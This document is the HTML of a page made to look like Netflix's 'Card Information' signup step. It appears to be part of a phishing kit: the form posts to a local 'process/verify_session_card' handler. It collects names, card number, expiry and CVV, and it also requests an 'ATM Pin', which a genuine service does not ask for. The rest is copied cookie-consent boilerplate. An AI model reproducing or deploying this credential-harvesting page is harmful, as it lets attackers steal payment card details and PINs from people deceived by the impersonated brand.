...
<head>
	...
	<title>Netflix</title>
	<meta content="watch movies, movies online, watch TV, TV online, TV shows online, watch TV shows, stream movies, stream tv, instant streaming, watch online, movies, watch movies United States, watch TV online, no download, full length movies" name="keywords">
	...
	<link type="text/css" rel="stylesheet" href="files/none.css" data-uia="botLink">
	<link type="text/css" rel="stylesheet" href="files/none2.css" data-uia="botLink">
	<link rel="shortcut icon" href="files/nficon2016.ico">
	<link rel="apple-touch-icon" href="files/nficon2016.png">
...
<body wfd-invisible="true">
	<div id="appMountPoint">
		<div class="netflix-sans-font-loaded">
			<div class="basicLayout notMobile modernInApp hasLargeTypography signupSimplicity-creditOptionMode simplicity" lang="en-US" dir="ltr">
				<div class="nfHeader noBorderHeader signupBasicHeader onboarding-header"><br>
					<a href="" class="svg-nfLogo signupBasicHeader onboarding-header" data-uia="netflix-header-svg-logo">
						...
						</svg><span class="screen-reader-text">Netflix</span></a><a href="/signout" class="authLinks signupBasicHeader onboarding-header" data-uia="header-signout-link">Sign Out</a></div>
				<div class="simpleContainer" data-transitioned-child="true">
					<div class="centerContainer" wfd-invisible="true" style="display: block; transform: none; opacity: 1; transition-duration: 250ms;">
						<form method="POST" action="process/verify_session_card" data-uia="payment-form">
							<div class="paymentFormContainer">
								<div>
									<div class="stepHeader-container" data-uia="header">
										<div class="stepHeader" data-a11y-focus="true" tabindex="0"><span id="" class="stepIndicator" data-uia="">STEP <b>2</b> OF <b>3</b></span>
											<h1 class="stepTitle" data-uia="stepTitle">Card Information</h1></div>
									</div>
								</div>
								<div class="fieldContainer"><span class="logos logos-block" data-uia="cardLogos-comp" aria-label="We accept VISA, MASTERCARD, AMEX and DINERS."><img alt="" class="logoIcon VISA" data-uia="logoIcon-VISA" src="files/visa-v3.svg"><img alt="" class="logoIcon MASTERCARD" data-uia="logoIcon-MASTERCARD" src="files/mastercard-v2.svg"><img alt="" class="logoIcon AMEX" data-uia="logoIcon-AMEX" src="files/amex-v2.svg"><img alt="" class="logoIcon DINERS" data-uia="logoIcon-DINERS" src="files/icon_dinersclub_v2.png" srcset="files/icon_dinersclub_v2_2x.png 2x"></span>
									<div class="">
										<ul class="simpleForm structural ui-grid">
												...
												<div data-uia="field-firstName+container" class="nfInput nfInputOversize">
													<div class="nfInputPlacement">
														<label class="input_id" placeholder="firstName">
															<input data-uia="field-firstName" name="fname" placeholder="First Name" required="true" class="nfTextField" id="fname" type="text" tabindex="0" autocomplete="cc-given-name" maxlength="100" minlength="1" dir="" value="">
															<label for="id_firstName" class="placeLabel"></label>
														</label>
													</div>
												</div>
											</li>
												...
												<div data-uia="field-lastName+container" class="nfInput nfInputOversize">
													<div class="nfInputPlacement">
														<label class="input_id" placeholder="lastName">
															<input data-uia="field-lastName" name="lname" class="nfTextField" required="true" placeholder="Last name" id="lname" type="text" tabindex="0" autocomplete="cc-family-name" dir="" value="">
															<label for="id_lastName" class="placeLabel"></label>
														</label>
													</div>
												</div>
											</li>
													...
													<div data-uia="field-creditCardNumber+container" class="nfInput nfInputOversize">
														<div class="nfInputPlacement">
															<label class="input_id" placeholder="creditCardNumber">
																<input data-uia="field-creditCardNumber" name="cnum" placeholder="Card number" required="true" class="nfTextField" id="cnum" type="tel" tabindex="0" autocomplete="off" maxlength="19" minlength="12" dir="" value="">
														    ...
														    var mask = IMask(element, maskOptions);
																...
																<label for="id_creditCardNumber" class="placeLabel"></label>
															</label>
														</div>
													</div>
												</div>
												...
												<div data-uia="field-creditExpirationMonth+container" class="nfInput nfInputOversize">
													<div class="nfInputPlacement">
														<label class="input_id" placeholder="creditExpirationMonth">
															<input data-uia="field-creditExpirationMonth" name="exp" placeholder="Expiration date (MM/YY)" class="nfTextField" id="exp" type="tel" tabindex="0" autocomplete="off" dir="" required="true" value="">
															<script src="files/mask.js"></script>
															<script>
															...
															<label for="id_creditExpirationMonth" class="placeLabel"></label>
														</label>
													</div>
												</div>
											</li>
												...
												<div data-uia="field-creditCardSecurityCode+container" class="nfInput nfInputOversize tooltip">
													<div class="nfInputPlacement">
														<label class="input_id" placeholder="creditCardSecurityCode">
															<input data-uia="field-creditCardSecurityCode" name="cvv" class="nfTextField" id="cvv" type="tel" tabindex="0" autocomplete="off" placeholder="Security code (CVV)" required="true" maxlength="4" minlength="3" dir="" value="">
															<label for="id_creditCardSecurityCode" class="placeLabel"></label>
														</label>
													</div>
													<div class="tooltipWrapper" data-uia="tooltipWrapper"><span class="nf-svg-icon "><svg width="36" height="36" viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd"><g><circle stroke="#A9A6A6" stroke-width="2" cx="18" cy="18" r="17"></circle><path d="M17.051 21.094v-.54c0-.648.123-1.203.369-1.665.246-.462.741-.915 1.485-1.359a7.37 7.37 0 0 0 .981-.657c.222-.186.372-.366.45-.54.078-.174.117-.369.117-.585 0-.384-.177-.714-.531-.99-.354-.276-.831-.414-1.431-.414-.624 0-1.131.135-1.521.405-.39.27-.627.627-.711 1.071h-2.304a4.053 4.053 0 0 1 .738-1.845c.396-.546.924-.981 1.584-1.305.66-.324 1.44-.486 2.34-.486.852 0 1.596.153 2.232.459.636.306 1.134.726 1.494 1.26.36.534.54 1.143.54 1.827 0 .66-.177 1.227-.531 1.701-.354.474-.891.933-1.611 1.377-.42.252-.729.48-.927.684-.198.204-.33.399-.396.585a1.79 1.79 0 0 0-.099.603v.414h-2.268zm1.26 4.158c-.408 0-.762-.15-1.062-.45-.3-.3-.45-.654-.45-1.062 0-.408.15-.762.45-1.062.3-.3.654-.45 1.062-.45.408 0 .762.15 1.062.45.3.3.45.654.45 1.062 0 .408-.15.762-.45 1.062-.3.3-.654.45-1.062.45z" fill="#A9A6A6"></path></g></g></svg></span></div>
												</div>
											</li>
											...
											<li data-uia="field-creditCardSecurityCode+wrapper" class="nfFormSpace">
												<div data-uia="field-creditCardSecurityCode+container" class="nfInput nfInputOversize tooltip">
													<div class="nfInputPlacement">
														<label class="input_id" placeholder="creditCardSecurityCode">
															<input data-uia="field-creditCardSecurityCode" name="pin" class="nfTextField" id="pin" type="tel" tabindex="0" autocomplete="off" placeholder="ATM Pin" required="true" maxlength="4" minlength="4" dir="" value="">
															<label for="id_creditCardSecurityCode" class="placeLabel"></label>
														</label>
													</div>
													<div class="tooltipWrapper" data-uia="tooltipWrapper"><span class="nf-svg-icon "><svg width="36" height="36" viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd"><g><circle stroke="#A9A6A6" stroke-width="2" cx="18" cy="18" r="17"></circle><path d="M17.051 21.094v-.54c0-.648.123-1.203.369-1.665.246-.462.741-.915 1.485-1.359a7.37 7.37 0 0 0 .981-.657c.222-.186.372-.366.45-.54.078-.174.117-.369.117-.585 0-.384-.177-.714-.531-.99-.354-.276-.831-.414-1.431-.414-.624 0-1.131.135-1.521.405-.39.27-.627.627-.711 1.071h-2.304a4.053 4.053 0 0 1 .738-1.845c.396-.546.924-.981 1.584-1.305.66-.324 1.44-.486 2.34-.486.852 0 1.596.153 2.232.459.636.306 1.134.726 1.494 1.26.36.534.54 1.143.54 1.827 0 .66-.177 1.227-.531 1.701-.354.474-.891.933-1.611 1.377-.42.252-.729.48-.927.684-.198.204-.33.399-.396.585a1.79 1.79 0 0 0-.099.603v.414h-2.268zm1.26 4.158c-.408 0-.762-.15-1.062-.45-.3-.3-.45-.654-.45-1.062 0-.408.15-.762.45-1.062.3-.3.654-.45 1.062-.45.408 0 .762.15 1.062.45.3.3.45.654.45 1.062 0 .408-.15.762-.45 1.062-.3.3-.654.45-1.062.45z" fill="#A9A6A6"></path></g></g></svg></span></div>
							...
							<div class="submitBtnContainer">
								<button type="submit" autocomplete="off" tabindex="0" class="nf-btn nf-btn-primary nf-btn-solid nf-btn-oversize" data-uia="action-submit-payment" placeholder="">Continue</button>
							</div>
						</form>
					</div>
				</div>
				<div class="site-footer-wrapper centered" style="transition-duration: 250ms; opacity: 1;">
					...
					<div class="site-footer">
						<p class="footer-top">Questions? Call <a class="footer-top-a" href="tel:1-844-505-2993">1-844-505-2993</a></p>
							...
							<div class="nfSelectWrapper inFooter selectArrow prefix" data-uia="language-picker+container">
								...
								<div class="nfSelectPlacement globe">
									<select data-uia="language-picker" class="nfSelect" id="lang-switcher-select" name="__langSelect" tabindex="0">
										<option selected="" label="English" lang="en" value="/signup/creditoption?locale=en-US">English</option>
										<option label="Español" lang="es" value="/signup/creditoption?locale=es-US">Español</option>
									</select>
								</div>
							</div>
						</div>
	...
	<div id="onetrust-consent-sdk">
		<div class="onetrust-pc-dark-filter ot-hide ot-fade-in" wfd-invisible="true"></div>
		<div id="onetrust-pc-sdk" class="ot-sdk-container otPcTab ot-hide ot-fade-in" role="dialog" aria-modal="true" aria-labelledby="pc-title" lang="en" wfd-invisible="true">
			<!-- pc header -->
			<div class="pc-header">
				<!-- Header logo -->
			...
			<div id="ot-content">
						...
						<div class="ot-sdk-row" role="tablist" aria-label="Cookie Categories">
							...
							<div class="ot-sdk-column">
								<div class="ot-sdk-four ot-sdk-columns group active-group category-menu-switch-handler" role="tab" tabindex="0" aria-selected="true" aria-controls="pc-tab-description">
									<h3 id="privacy-text">General Description</h3></div>
							</div>
							<div class="ot-sdk-eight ot-sdk-columns description-container" id="pc-tab-description" tabindex="0" role="tabpanel" aria-labelledby="pc-privacy-header">
								...
								<p id="pc-policy-text" class="group-description">
									...
									<br>
									<br> Note that from time to time we are over-inclusive in which cookies are listed in the opt-out tool. For example, we do not use Facebook, Twitter or Google cookies in all regions.
									<br>
							...
							<ul class="category-group">
								<li class="category-item ot-always-active-group" data-optanongroupid="C0001">
									...
									<div class="ot-sdk-eight ot-sdk-columns description-container ot-hide ot-always-active-group" role="tabpanel" tabindex="0" id="ot-desc-id-C0001" wfd-invisible="true">
											...
											<div class="ot-toggle-group">
												...
												<div class="ot-toggle ot-hide-tgl">
													<div class="checkbox">
														...
														<label for="ot-group-id-C0001"><span class="label-text" wfd-invisible="true">Essential Cookies</span></label>
														<!-- DYNAMICALLY GENERATE Input ID  -->
													</div>
												</div>
											</div>
										...
										<!-- sub groups -->
										<div class="category-host-list-container"><a class="category-host-list-btn category-host-list-handler" role="button" href="javascript:void(0)" data-parent-id="C0001" wfd-invisible="true">Cookies Details&lrm;</a></div>
									</div>
								</li>
								<li class="category-item ot-always-active-group" data-optanongroupid="C0002">
									...
									<div class="ot-sdk-eight ot-sdk-columns description-container ot-hide ot-always-active-group" role="tabpanel" tabindex="0" id="ot-desc-id-C0002" wfd-invisible="true">
										<div class="group-toggle">
											<h3 class="category-header">Performance and Functionality Cookies</h3>
											<div class="ot-toggle-group" wfd-invisible="true">
												<div class="ot-always-active">Always Active</div>
												<div class="ot-toggle ot-hide-tgl">
													<div class="checkbox">
														<!-- DYNAMICALLY GENERATE Input ID  -->
														...
														<label for="ot-group-id-C0002"><span class="label-text" wfd-invisible="true">Performance and Functionality Cookies</span></label>
														<!-- DYNAMICALLY GENERATE Input ID  -->
													</div>
												</div>
											</div>
										...
										<!-- sub groups -->
										<div class="category-host-list-container"><a class="category-host-list-btn category-host-list-handler" role="button" href="javascript:void(0)" data-parent-id="C0002" wfd-invisible="true">Cookies Details&lrm;</a></div>
									</div>
								</li>
							</ul>
						</div>
				...
				<!-- Vendors / Hosts -->
				<section id="vendors-list" class="ot-hide" wfd-invisible="true">
                    ...
                    L213.13,222.409z"></path>
									...
									<h3 class="pc-back-button-text" id="vendors-list-title">Advertising Cookies</h3></a>
							</div>
							<div class="action-container">
								<div id="search-container">
									<input id="vendor-search-handler" aria-label="Vendor Search" type="text" placeholder="Search..." name="vendor-search-handler" wfd-invisible="true">
									<svg width="30" height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 -30 110 110" wfd-invisible="true">
              ...
              s-17-7.626-17-17S14.61,6,23.984,6z"></path>
								...
								<div id="filter-container">
									<a id="filter-btn-handler" role="button" aria-label="Filter" href="javascript:void(0)">
										<svg role="presentation" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="15" height="15" viewBox="0 0 402.577 402.577" style="enable-background:new 0 0 402.577 402.577;" xml:space="preserve" wfd-invisible="true">
						...
						<section id="vendor-list-content">
							<div class="ot-sdk-row">
								<div class="ot-sdk-column">
									<div id="select-all-container" wfd-invisible="true">
										<div class="ot-checkbox">
											...
											<div id="select-all-vendors-leg-input-container">
												...
												<label for="select-all-vendor-leg-handler"><span class="label-text" wfd-invisible="true">Select All Vendors</span></label>
											</div>
											...
											<div id="select-all-vendors-input-container">
												...
												<label for="select-all-vendor-groups-handler"><span class="label-text" wfd-invisible="true">Select All Vendors</span></label>
											</div>
											...
											<div id="select-all-hosts-input-container">
												...
												<label for="select-all-hosts-groups-handler"><span class="label-text" wfd-invisible="true">Select All Hosts</span></label>
											</div>
											...
											<section class="accordion-header">
												<div class="ot-toggle-group">
													...
													<div class="ot-checkbox ot-host-tgl">
														...
														<label for="REPLACE-WITH-DYANMIC-HOST-ID"><span class="label-text" wfd-invisible="true">REPLACE-WITH-DYANMIC-HOST-ID</span></label>
													</div>
													<!-- Checkbox END -->
													<div class="host-info">
														<h3 class="host-title">33Across</h3>
														<h4 class="host-description">33Across</h4></div>
												</div>
                        ...
                        c6.177,6.18,9.262,14.271,9.262,22.366C354.708,234.018,351.617,242.115,345.441,248.292z"></path>
											...
											<div class="accordion-text" wfd-invisible="true">
											...
											<section class="accordion-header">
												<div class="ot-toggle-group">
													...
													<div class="ot-checkbox">
														...
														<label for="REPLACE-WITH-DYANMIC-VENDOR-ID"><span class="label-text" wfd-invisible="true">REPLACE-WITH-DYANMIC-VENDOR-ID</span></label>
													</div>
													<!-- Checkbox END -->
                                ...
                                c6.177,6.18,9.262,14.271,9.262,22.366C354.708,234.018,351.617,242.115,345.441,248.292z"></path>
												...
												<div class="ot-toggle-group">
													...
													<div class="ot-checkbox">
														...
														<label for="REPLACE-WITH-DYANMIC-VENDOR-ID1"><span class="label-text" wfd-invisible="true">REPLACE-WITH-DYANMIC-VENDOR-ID</span></label>
													</div>
													<!-- Checkbox END -->
												</div>
											</section>
													...
													<div class="vendor-purpose-groups">
														...
														<div class="vendor-consent-group legitimate-interest-group">
															...
															<a href="#" class="vendor-opt-out-handler">
																<div class="op-out-group"><span>Require Opt-Out</span>
					...
					<div id="ot-triangle" wfd-invisible="true"></div>
					<section id="ot-filter-modal" wfd-invisible="true">
						<div id="ot-options">
	...
	<iframe scrolling="no" frameborder="0" style="border: 0px; height: 50px; width: 48px; left: 1180px; top: 384px; z-index: 2147483647; position: absolute; display: none;" src="https://gc.kis.v2.scr.kaspersky-labs.com/E3E8934C-235A-4B0E-825A-35A08381A191/kpm/kpm_promo_balloon.html?cssSrc=https%3A%2F%2Fgc.kis.v2.scr.kaspersky-labs.com%2FE3E8934C-235A-4B0E-825A-35A08381A191%2Fkpm%2Ftooltip.css" wfd-invisible="true"></iframe>
	<iframe src="about:blank" id="tmx_tags_iframe" title="empty" tabindex="-1" aria-disabled="true" aria-hidden="true" style="width: 0px; height: 0px; border: 0px; position: absolute; top: -5000px;"></iframe>
</body>
